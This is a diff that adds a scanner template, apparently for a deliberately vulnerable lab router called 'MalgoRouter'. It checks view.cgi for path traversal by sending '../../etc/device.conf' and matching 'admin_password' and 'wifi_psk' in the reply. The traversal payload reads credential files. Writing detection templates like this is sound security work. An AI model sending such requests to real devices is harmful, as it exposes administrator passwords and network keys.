@@ -1,0 +1,35 @@
+id: malgorouter-view-path-traversal
+
+info:
+  name: MalgoRouter view.cgi - Path Traversal (arbitrary file read)
+  author: opencode
+  severity: high
+  description: |
+    /cgi-bin/view.cgi concatenates the "file" parameter onto the /www docroot
+    without canonicalisation. At the default (low) difficulty there is no
+    filtering, so traversal reads any file (device secrets, /etc/shadow).
+  reference:
+    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10822
+  classification:
+    cwe-id: CWE-22
+  metadata:
+    max-request: 1
+    product: malgorouter
+    vendor: glinet
+  tags: malgorouter,lfi,traversal,cwe-22
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/cgi-bin/view.cgi?file=../../etc/device.conf"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "admin_password"
+          - "wifi_psk"
+        condition: and
+      - type: status
+        status:
+          - 200
